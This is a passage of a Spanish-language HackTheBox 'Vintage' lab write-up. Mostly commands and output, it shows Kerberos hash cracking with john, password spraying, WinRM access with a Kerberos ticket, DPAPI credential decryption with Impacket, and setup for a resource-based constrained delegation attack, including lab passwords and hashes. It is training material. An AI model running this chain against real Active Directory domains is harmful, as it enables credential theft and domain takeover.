c11175f013be7a65b4125886e50c59cb644a15d2be7254b94a02b4475e6e960529f74b40b057f2a55978cb62b9e5ce369b67676c96a8de6904a2d62078f917ece3c008a8eda57a9a6867cc4b0481369462c1a0a1e45c371f5117228d0d5aad26dcc349ded77fcde7fff1ff9e0a18b80240c8b74cfac86e76a30762b2da2db0f2dd1cfce278e1bb82c3e3894ecf2c4984a9e5826a0bde33ede993887fcf317bf95260234e3fdc6f2b598be078cf7473c707f851241df8b8a5f90fe54
$krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb/svc_ldap*$47593d71b1df533dee6101df036d5fa8$6fb3f957bb428840a88236dbc35b4323296b2ad07d14b1a8961f7f4ce8a33c9b7639c5e88e26f7cc715c5c7fba3eed17aa0789a2ab9dc908f4f06e94685f0c686a15f67dcf869ddfaa621c3bd14ca44a88fb77adb1b6ea6b89755dd23b242ebb49c50b8d87a7bc4229b31ddd1f0a502c3cd9e49a3f16ef1975412bc04b17ca7e992acbeae6589d8566d30ae0885a8ecbecd8aea4f904aeb2e55daa58c40bf4f72b32c62e42d3a5956a9c6d6530f60c9558b3f074da6a2f79c64da1afa538bade418dbf52dd43c08d1b7ef8985e7515588c952cf287afdabba580dcea8735d24352afc411d0d127a1671367d86e54763327298ab03a39ffc4ffa1903c14a2901961b37d8807a039b82eca4e7d47b597b3b4256f0d4d0268b49bb9cdedd65b3e1c012d61b345971c67efcc98bdafe2ddfbbd52a4eba958923b9f0df1e1cf5b0c3a0855b17c4657c2de4dfa693df8fe5fb6354830273a42d5887f3a523d63530efd848e9909b1bce7b993e94679674b9062e8f9d11ebe3789f46d1a7774c508910782ebd373c41ebdb934934a0dea39d216611e5d86ef809951e7390ffea5cd5a8d1cea6beab93880d05b4b2ed58f0ffa854e0d2afa6e983445acf5f0603ed5dd9b75bdbb57ead907b8265fccd250d7b35ad5e2ffe0d4f7c5c3fed8319ee2f6e2cabc641369e601ce20641113362f48c007968ef1ebcfe8268866e931377ca4fbe90b4ccb99a68539d9e756b8caccff0d286ff52cd394b19fcc2d14ea25aa1602d9c6331be3de191b22c95cba851a38601d6e66f18b8f7c06e5de553e16526da3c72e83fdff1343562115d0d8551b1d26a575797e7da920bc784bb1312e33db81f13c0cfce6a035d26ff2918acd2ee4d988a7ec7d582ec99970ae1fb6cea7cb4f6b5ee2299ebd6cd6c8ac24e6beb74092fdc2ef751b7877463a4c137bba6bb3aef3f441b3f89950685d5734e4e89186091febdd1177cf27767d8262a833d61873c4657bd7a83fd133e9673a499b94be570b81fedd87849fb1c20544a42ad33340d86cf9ee4b888d5d476b4b89883af9ec8d41d86e41873b1542bc1ca0572ebe55e908ccad91e545ec478e5255ec43abc8e0a8fc87839475437fb3397a8e1bcd3db10b957383624d91622e27e5f2fc24fe2175545afb048feb80336d2c1f26a1e7ffa6809fd7fe4200cddd1fa78dc23e85e9fe5f078396571683c6f4f4499b43fde1015a15215a7e9e2041da1486133099f61b19931de6b6ff0d1257dfd4fbc273b556b3e8372aeb5203260997348aa0945fc8774b656f8ff779b17d70384d541050356201d41c11d437a365b7c6454debcdcb94b7ea4dcac131a536a224ff88104ff8975b2d4dc73027cf4928ff9d8661ce78a34862b5db963c40c2960de90adaadb3ed7e67667137c6d612c7d44c2e53a658a3391ac399cb2badec26cdfdf496b92d91
$krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb/svc_ark*$d57f47fa861a2a0244b07afd3aaa4b51$c972edeb8637195e5d8fe18399e9036f39c291ef1b2fb553e6896a38b0be9920f69e4dcf71b06b68a1a124488b1065f6c6317e355bcc223362a2560a940f8ef422e4937530a110fd0f1059c34e355809c0f27ed791195feedabbda65312718ebdbfff85ef4ed7fb4e232287391461b3da6d66bc2ae1ec90a9428250b62141b9210e19f0f1743ec5ef3b2727790421a8b8457caa6c9ecb0d272d33f4db71c8ded1a56867c3b0948e40ca78c30c4a817abd9e636e8dc5e06095bf139bbe01733dba9aaca7d13340aa7501f825dc53fede6fbc0cd121110354d0a8edd8f0bf942281ace472e875e1eaf4a7f1b62e0c8aee6f45675f86e33a52bab3763b4d522f2920ecda3e64d076eb0b8bfb2a3d963f77a090d34f02025c2f8bfbd5a59545ff9fa98a74f44ba7df806b2ceb6d70010522d57ccb4bf6605d0204406b4a66ddab431277662c8a33740cd750da730b04abc995973e4e9437971a593b6e8968ab0e11841cfabc153cd925f30c4eec32ee8d95e46ee6f62c65d60199e4b18396c2158f59171ec2466ab45fd680198e9b1a801c18b887353b13eadce8f06f4f36b954831009b35fb68b6c482207154b92826b5f133c13e839740b94d81f8419eca3829c98fec3fa212f8af9a5a735abc6c8bb675a5301f560ca82243a9a3ca8e68acf1ac7fc13fe9e8574d56583c2f7ad097ec4906e84a4d9a9adb3dbd2023ac6f1ddad25d235a4be3d64cb39c02bbfba509177e6b0a12c62e4b18b04f70e09d2631ee49d05880baa1973c1245643e37a1b7772fa6a293969e182a240cf42b7213b228800864fb61c93425c10170c194f3c16aa132d77c17e43e2400bdcbdf5991ba31915ac7eae98333861b739378c6d7fbf35074a893cf72a4fa0c6fda0a93157568729007801df33c36b51348e8cb337111d1e52a39d5dd1db371afa6d947f10b5b8c5ac0f3b5914001aef284c8fc051afe46a7d2db48f065e6903c9e773a7e70cc67c4238ddfa49333f681e272f2440d24e11bfecb7486505925dd38ecd7dea578f328bd96df871d529b4261246b8a48bb8063515cc9c7a626f76c0df02e55562180fcc544043b98bcdc00e86d59da2ea21e7342f9fc1e070d681d9fdf99b45012d80be4fcddf4288c25ee914ad020c2fd46be81e390f533d3249bf55fe81467f42fe92f481a5bb33d7035c83fbef53c24e0e9a02b4a3732d2da7146c65905ed413ce13bcaea75ce0b62189b116aff932ab01fa4d2e7483983df0539f710620bf3a06bbcac17eaa20c9a2545fb7a5f31a1456e89dfab70d5d3f634bc3e1160d01e83efbb01ec4cb9ed75fcf2a0a9bdba6d26487bff698f35d4b517ed833a8646e04719e9025c283041532f17fc33ea7fe7127d84ca7001956157f4c35b6382f4247007199290c70600e0f9b68340deb6cb36ba586ba388d6d0903e9f14ed3151bff9241e
```

***
### Cracking Hashes with John

Después de obtener los hashes **TGT** y **TGS** de los tres usuarios (ya sea mediante AS-REP Roasting o Kerberoasting), los guardamos en un archivo llamado `hashes` para proceder a crackearlos.

Utilizamos `john` con la clásica wordlist `rockyou.txt` y logramos obtener la contraseña del usuario `svc_sql@vintage.htb`..

> Aunque con los permisos de **GenericAll** podríamos haber cambiado directamente la contraseña o ejecutado otros ataques, optamos por este enfoque para **no romper la cadena de autenticación Kerberos** y aprovechar el acceso tal como está
{: .prompt-info }

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Zer0the0ne       ($krb5asrep$23$svc_sql@VINTAGE.HTB)     
1g 0:00:00:28 DONE (2025-04-25 00:17) 0.03556g/s 510090p/s 1057Kc/s 1057KC/s !SkicA!..But_Lying_Aid9!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

***
### Password Spraying with Kerbrute and NetExec

Al obtener estas credenciales, una de las prácticas más comunes es realizar un **Password Spraying** para comprobar si la contraseña se reutiliza en otras cuentas del dominio.

Podemos hacerlo con herramientas como **Kerbrute**, que realiza el spraying vía Kerberos, o con **NetExec**, utilizando el parámetro (`-k`) para Kerberos y (`--continue-on-success`) para que el ataque no se detenga al encontrar una credencial válida.

En el resultado obtenido, comprobamos que las credenciales son válidas para los siguientes usuarios:

* svc_sql@vintage.htb
* C.Neri@vintage.htb

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb**
{: .prompt-danger }

**Kerbrute**

```bash
❯ kerbrute passwordspray -d vintage.htb --dc "$FQDN" users.txt 'Zer0the0ne'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop

2025/04/25 00:19:07 >  Using KDC(s):
2025/04/25 00:19:07 >  	dc01.vintage.htb:88

2025/04/25 00:19:08 >  [+] VALID LOGIN:	svc_sql@vintage.htb:Zer0the0ne
2025/04/25 00:19:08 >  [+] VALID LOGIN:	C.Neri@vintage.htb:Zer0the0ne
2025/04/25 00:19:08 >  Done! Tested 14 logins (2 successes) in 0.327 seconds
```

**NetExec**

```bash
❯ nxc ldap "$FQDN" -u users.txt -p 'Zer0the0ne' -k --continue-on-success
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        dc01.vintage.htb 389    DC01             [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        dc01.vintage.htb 389    DC01             [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED
LDAP        dc01.vintage.htb 389    DC01             [-] vintage.htb\krbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED
LDAP        dc01.vintage.htb 389    DC01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        dc01.vintage.htb 389    DC01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        dc01.vintage.htb 389    DC01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        dc01.vintage.htb 389    DC01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\C.Neri:Zer0the0ne 
LDAP        dc01.vintage.htb 389    DC01             [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\svc_sql:Zer0the0ne 
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\svc_ldap account vulnerable to asreproast attack 
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\svc_ark account vulnerable to asreproast attack 
LDAP        dc01.vintage.htb 389    DC01             [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        dc01.vintage.htb 389    DC01             [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
```

***
### Abusing WinRM with Kerberos TGT (Ticket Granting Ticket)

Revisando nuevamente en BloodHound-CE, nos encontramos que el usuario C.Neri@vintage.htb forma parte del grupo Remote Management Users, con lo cual podríamos conectarnos por RDP (Puerto 3389) o WinRM (Puerto 5985). En este caso, la máquina tiene abierto WinRM y intentaremos conectarnos a través de este protocolo.

> **WinRM**, o Administración Remota de Windows, es un protocolo que permite gestionar sistemas Windows de forma remota. Para que se entienda fácil: es como el **SSH de Windows**, una forma de conectarse y administrar remotamente, similar a cómo usamos PuTTY o SSH en Linux.
{: .prompt-info }

![image](/assets/img/writeups/htb-vintage/Vintage_18.png)

A través de la herramienta `getTGT.py` de la suite **Impacket**, solicitamos un **TGT (Ticket Granting Ticket)** para autenticarnos como el usuario `C.Neri@vintage.htb`.

Una vez obtenido el ticket (`.ccache`), lo exportamos en la variable `KRB5CCNAME`, y con la utilidad `klist` verificamos que el TGT se haya cargado correctamente en nuestra sesión.

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
❯ impacket-getTGT vintage.htb/C.Neri:'Zer0the0ne' -dc-ip "$IP"
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in C.Neri.ccache

❯ export KRB5CCNAME=$(pwd)/C.Neri.ccache

❯ klist
Ticket cache: FILE:/home/gzzcoo/Desktop/HackTheBox/Labs/Windows/AD/Vintage/content/C.Neri.ccache
Default principal: C.Neri@VINTAGE.HTB

Valid starting       Expires              Service principal
04/25/2025 00:25:08  04/25/2025 10:25:08  krbtgt/VINTAGE.HTB@VINTAGE.HTB
	renew until 04/26/2025 00:22:32
```

Nos conectamos al Domain Controller (`dc01.vintage.htb`) usando la herramienta **evil-winrm**, aprovechando el **TGT (.ccache)** del usuario `C.Neri@vintage.htb` previamente obtenido y exportado en la variable `KRB5CCNAME`.

Verificamos que logramos acceder al **DC** y obtenemos finalmente la flag **user.txt**.

> Para poder conectarnos a **WinRM** mediante **Evil-WinRM** a través de la autenticación de **Kerberos** con el TGT (**.ccache**), deberemos de tener configurado nuestro sistema correctamente para no tener problemas.
> 
> Para ello, podemos seguir la siguiente configuración donde se explica detalladamente. [Evil-WinRM Kerberos](https://gzzcoo.gitbook.io/pentest-notes/tools/evil-winrm#kerberos).
{: .prompt-info }

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb**
{: .prompt-danger }

```bash
❯ evil-winrm -i "$FQDN" -r vintage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc` for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents> type ../Desktop/user.txt
691d******************7e1d2a48b0
```

***
## Auth as C.Neri\_adm

### Abusing DPAPI Secrets to Move Laterally (impacket-dpapi)

Una vez que conseguimos acceso al **Domain Controller**, el siguiente objetivo será escalar privilegios y convertirnos finalmente en **Domain Admins**.

Buscando posibles vectores de escalada, identificamos la opción de abusar de **DPAPI (Data Protection API)**, lo cual puede permitirnos acceder a credenciales protegidas y movernos lateralmente por el dominio.

> **DPAPI (Data Protection API)** es una API de Windows que protege datos sensibles como contraseñas y claves mediante criptografía. Su objetivo es asegurar que solo el usuario o equipo autorizado pueda acceder a esa información. Sin embargo, si un atacante tiene acceso al sistema o privilegios elevados, puede extraer o descifrar estos secretos usando herramientas como **Mimikatz** o **Impacket**.
> 
> Esto se convierte en un vector de escalación de privilegios, ya que los secretos protegidos pueden contener credenciales que permiten el acceso a otras cuentas o servicios.
{: .prompt-info }

https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets

En las siguientes rutas es donde se suelen almacenar las credenciales protegidas por DPAPI.

> `C:\Users$USER\AppData\Local\Microsoft\Credentials\`
> `C:\Users$USER\AppData\Roaming\Microsoft\Credentials\`
{: .prompt-info }

En el caso del usuario `C.Neri`, dispone de una credencial llamada `C4BB96844A5C9DD45D5B6A9859252BA6` ubicada en `C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials`.

Esta credencial se encuentra oculta, para poder descargarla a través del módulo `download` que ofrece **evil-winrm**, deberemos de quitarle el atributo `Hidden` y `System`. Seguidamente, nos dejará realizar el la descarga del archivo en nuestro equipo local.

```powershell
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> ls -force


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6

*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> attrib -h -s C4BB96844A5C9DD45D5B6A9859252BA6

*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> download C4BB96844A5C9DD45D5B6A9859252BA6
                                        
Info: Downloading C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6 to C4BB96844A5C9DD45D5B6A9859252BA6
                                        
Info: Download successful!
```

Las credenciales protegidas por **DPAPI** están cifradas utilizando una **Master Key específica del usuario**, derivada de su contraseña.

Estas Master Keys suelen almacenarse en la siguiente ruta:

> `C:\Users\$env:$USERNAME\AppData\Roaming\Microsoft\Protect\$SUID\$GUID`
{: .prompt-info }

En nuestro caso, encontramos dos posibles Master Keys en esa ubicación. Sabemos que una de ellas es la que se utiliza para proteger la credencial que descargamos anteriormente.

Herramientas como **Mimikatz** o **winPEAS** permiten identificar directamente qué Master Key corresponde a cada secreto, pero en este caso lo hicimos manualmente probando ambas, y determinamos que la correcta era: `99cf41a3-a552-4cf7-a8d7-aca2d6f7339b`.

Dado que tiene los atributos `Hidden` y `System`, se los quitaremos a través de `attrib -h -s` y podremos descargar la master key a través del módulo `download` de **evil-winrm**.

```powershell
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> ls -force


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred

*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> attrib -h -s 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b

*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
                                        
Info: Downloading C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b to 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
                                        
Info: Download successful!
```

A continuación, el siguiente paso será **descifrar la credencial protegida por DPAPI** utilizando la herramienta `dpapi.py` de la suite **Impacket**.

El primer paso consiste en **descifrar la Master Key**. Para ello, necesitaremos:

* El archivo de la **Master Key** descargado previamente.
* El **SID** (Security Identifier) del usuario, que podemos obtener de la ruta donde estaba almacenada la Master Key.
* La **contraseña** del usuario propietario de esas credenciales protegidas por DPAPI, en este caso, el usuario `C.Neri` ya que estamos trabajando en local con los archivos.

Finalmente logramos desencriptar la Master Key con éxito.

```bash
❯ impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password 'Zer0the0ne'
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```

Para finalizar, vamos a **descifrar la credencial protegida por DPAPI** utilizando la **Master Key** que recuperamos en el paso anterior.

Para ello necesitaremos:

* El archivo de la **credencial protegida** que descargamos previamente (`C4BB96844A5C9DD45D5B6A9859252BA6`).
* La **Master Key desencriptada**.

En la salida obtenemos lo que parece ser un nuevo conjunto de credenciales, correspondientes al usuario `c.neri_adm@vintage.htb`, junto con su contraseña.

```bash
❯ impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

Probamos las nuevas credenciales obtenidas para el usuario `c.neri_adm@vintage.htb` utilizando la herramienta **NetExec** (**nxc**) contra el servicio **LDAP**, autenticándonos mediante Kerberos.

En el resultado comprobamos que las credenciales son válidas, confirmando así que tenemos acceso como `c.neri_adm` dentro del dominio y podemos seguir avanzando.

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb**
{: .prompt-danger }

```bash
❯ nxc ldap "$FQDN" -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' -k
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
```

***
## Shell as L.Bianchi\_adm (Domain Admin)

### Finding an entry vector to elevate our privileges with BloodHound

Revisamos nuevamente en BloodHound-CE qué opciones tenemos con el usuario `c.neri_adm@vintage.htb`, que es el que disponemos actualmente.

Verificamos que este usuario forma parte del grupo `Remote Desktop Users`, lo que nos permitiría conectarnos directamente al Domain Controller (`dc01.vintage.htb`) mediante WinRM, y además comprobamos que también pertenece al grupo `DELEGATEDADMINS`, grupo que investigaremos a continuación para ver si podemos sacarle algún provecho en cuanto a privilegios o delegaciones configuradas.

![image](/assets/img/writeups/htb-vintage/Vintage_19.png)

Por otro lado, también verificamos que el usuario `c.neri_adm@vintage.htb` dispone de permisos de ACL sobre el grupo `DELEGATEDADMINS`, concretamente los privilegios de `AddSelf` y `GenericWrite`.

Gracias a estos permisos, el usuario tiene la capacidad de añadirse a sí mismo o añadir a cualquier otro usuario al grupo mencionado.

![image](/assets/img/writeups/htb-vintage/Vintage_20.png)

También comprobamos que hay dos miembros que forman parte del grupo `DELEGATEDADMINS`: el usuario que disponemos actualmente `c.neri_adm@vintage.htb` y otro nuevo llamado `l.bianchi_adm@vintage.htb`.

![image](/assets/img/writeups/htb-vintage/Vintage_21.png)

Este segundo usuario pertenece además al grupo `DOMAIN ADMINS`, por lo que se trata de un Administrador del Dominio.

Esta información nos resulta bastante útil, ya que si bien no podemos acceder directamente al usuario `Administrator`, podríamos apuntar a este otro objetivo que también tiene privilegios de Domain Admin, y tratar de comprometerlo a través de la relación que mantiene con el grupo `DELEGATEDADMINS`.

![image](/assets/img/writeups/htb-vintage/Vintage_22.png)

Buscando rutas para elevar nuestro privilegio y lograr convertirnos en Domain Admin, nos encontramos con el siguiente path. Los miembros del grupo `DELEGATEDADMINS` disponen del privilegio ACL de `AllowedToAct`, es decir, tienen configurado el atributo `msds-AllowedToActOnBehalfOfOtherIdentity` sobre el controlador de dominio `DC01.VINTAGE.HTB`. Esto nos permitiría realizar un ataque de **Resource-Based Constrained Delegation (RBCD)** y suplantar a un Domain Admin.

Para que este ataque funcione correctamente, debemos tener en cuenta lo siguiente:

1. Los usuarios que queramos suplantar **no deben pertenecer al grupo `Protected Users`** ni tener restricciones de delegación aplicadas.
2. El usuario que añadimos al atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` debe tener **un SPN (Service Principal Name)** configurado, ya que el proceso de `S4U2self` y `S4U2proxy` requiere un servicio válido asociado al usuario.

En este punto, el objetivo es conseguir una cuenta que tenga un SPN ficticio para poder realizar el **RBCD Attack** e impersonar al Domain Admin `l.bianchi_adm@vintage.htb`.

Si revisamos los usuarios de los que ya disponemos credenciales:

* **P.Rosa** → lo añadimos previamente al grupo `SERVICEMANAGERS@vintage.htb` y tenemos sus credenciales.
* **svc\_sql** → tenemos sus credenciales y control total sobre él formando parte del grupo `SERVICEMANAGERS@vintage.htb` .
* **C.Neri** → solo disponemos de su contraseña.
* **C.Neri\_adm** → forma parte de `DELEGATEDADMINS` y puede añadir usuarios a ese grupo.

Teniendo esto en cuenta, la estrategia es añadir primero al usuario `svc_sql` al grupo `DELEGATEDADMINS`, ya que solo los miembros de este grupo tienen el permiso `AllowedToAct` sobre el DC. Una vez añadido, aprovecharemos que `P.Rosa` tiene control total sobre `svc_sql` para asignarle un SPN ficticio, dejándolo preparado para ejecutar el ataque de RBCD.

Con todo esto en cuenta, ya tenemos el escenario listo para ejecutar el ataque de RBCD.

![image](/assets/img/writeups/htb-vintage/Vintage_23.png)

***
### Abusing AllowedToAct privileges (Resource-based Constrained Delegation \[RBCD Attack] through SVC\_SQL user) with impacket-getST&#x20;

> En los siguientes pasos repetiremos algunos pasos realizados anteriormente, esto debido que los permisos/ACL que realizamos al principio se resetean cada x tiempo. Para evitar errores, realizaremos el paso a paso.
{: .prompt-danger }

**Añadir al usuario SVC\_SQL al grupo DELEGATEDADMINS**

El objetivo en este punto es añadir al usuario `svc_sql@vintage.htb` al grupo `DELEGATEDADMINS`, para que así herede el permiso `AllowedToAct` sobre el Domain Controller y podamos ejecutar el ataque de RBCD.

Para ello, el primer paso será solicitar el TGT (Ticket Granting Ticket) del usuario `c.neri_adm@vintage.htb`, quien tiene permisos de `GenericWrite` que nos permitirán añadir usuarios al grupo `DELEGATEDADMINS`. Usaremos la herramienta `getTGT.py` de Impacket para obtener su TGT en formato `.ccache`, lo exportaremos con la variable `KRB5CCNAME` y verificaremos con `klist` que se haya cargado correctamente en la sesión.

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
❯ impacket-getTGT vintage.htb/c.neri_adm:Uncr4ck4bl3P4ssW0rd0312 -dc-ip "$IP"
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.neri_adm.ccache

❯ export KRB5CCNAME=$(pwd)/c.neri_adm.ccache

❯ klist
Ticket cache: FILE:/home/gzzcoo/Desktop/HackTheBox/Labs/Windows/AD/Vintage/content/c.neri_adm.ccache
Default principal: c.neri_adm@VINTAGE.HTB

Valid starting       Expires              Service principal
04/25/2025 03:58:01  04/25/2025 13:58:01  krbtgt/VINTAGE.HTB@VINTAGE.HTB
	renew until 04/26/2025 03:55:24
```

Para añadir al usuario `svc_sql@vintage.htb` al grupo `DELEGATEDADMINS`, tenemos varias formas de hacerlo mediante autenticación Kerberos.

En nuestro caso, usamos tanto **bloodyAD** como **PowerView.py**, ya que ambas permiten realizar esta acción utilizando un TGT en caché.

En ambas herramientas nos conectamos a través de Kerberos mediante el TGT (`.ccache`) cargado en la variable `KRB5CCNAME` y añadimos al usuario `SVC_SQL` al grupo mencionado.

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb** y la variable de entorno `IP` que tiene como valor la dirección IP de **Vintage** - **10.10.11.45**.
{: .prompt-danger }

**bloodyAD**

```bash
❯ bloodyAD -d vintage.htb --host "$FQDN" -k add groupMember 'DELEGATEDADMINS' 'SVC_SQL'
[+] SVC_SQL added to DELEGATEDADMINS
```

**PowerView.py**

```bash
❯ powerview vintage.htb/'c.neri_adm'@"$FQDN" -k --no-pass --dc-ip "$IP"
Logging directory is set to /home/gzzcoo/.powerview/logs/vintage-c.neri_adm-dc01.vintage.htb
[2025-04-24 23:58:37] [Storage] Using cache directory: /home/gzzcoo/.powerview/storage/ldap_cache

(LDAP)-[dc01.vintage.htb]-[VINTAGE\c.neri_adm]
PV > Add-DomainGroupMember -Identity 'DELEGATEDADMINS' -Members 'SVC_SQL'
[2025-04-25 23:59:18] User SVC_SQL successfully added to SERVICEMANAGERS
```


**Añadir al usuario P.ROSA al grupo SERVICEMANAGERS**

Como comentamos al inicio, es posible que los permisos y cambios aplicados anteriormente se hayan reseteado. Por eso, vamos a repetir el proceso paso a paso para evitar problemas.

Volveremos a añadir al usuario `P.Rosa@vintage.htb` al grupo `SERVICEMANAGERS`. Para ello, primero solicitaremos el TGT (Ticket Granting Ticket) de la cuenta `GMSA01$` utilizando la herramienta `getTGT.py` de la suite Impacket.

El TGT se almacenará en un archivo `.ccache`, que luego exportaremos en la variable `KRB5CCNAME` para poder usarlo en futuras autenticaciones. Finalmente, validaremos con `klist` que el TGT esté cargado correctamente.

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
❯ impacket-getTGT vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178 -dc-ip "$IP"
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in GMSA01$.ccache

❯ export KRB5CCNAME=$(pwd)/'GMSA01$.ccache'

❯ klist
Ticket cache: FILE:/home/gzzcoo/Desktop/HackTheBox/Labs/Windows/AD/Vintage/content/GMSA01$.ccache
Default principal: GMSA01$@VINTAGE.HTB

Valid starting       Expires              Service principal
04/25/2025 04:01:52  04/25/2025 14:01:52  krbtgt/VINTAGE.HTB@VINTAGE.HTB
	renew until 04/26/2025 03:59:15
```

Para añadir al usuario `P.Rosa` al grupo `SERVICEMANAGERS`, tenemos varias formas de hacerlo mediante autenticación Kerberos.

